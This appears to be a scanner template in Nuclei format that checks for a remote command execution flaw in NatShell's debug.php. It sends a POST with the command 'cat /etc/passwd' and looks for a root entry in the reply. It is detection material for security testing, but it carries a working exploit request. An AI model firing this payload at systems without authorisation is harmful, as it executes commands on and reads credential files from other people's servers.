id: natshell-rce
info:
  author: pikpikcu
  name: NatShell Debug File RCE
  reference: https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw
  severity: critical
  tags: natshell,rce
requests:
- body: 'cmd=cat /etc/passwd

    '
  matchers:
  - regex:
    - toor:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/debug.php'
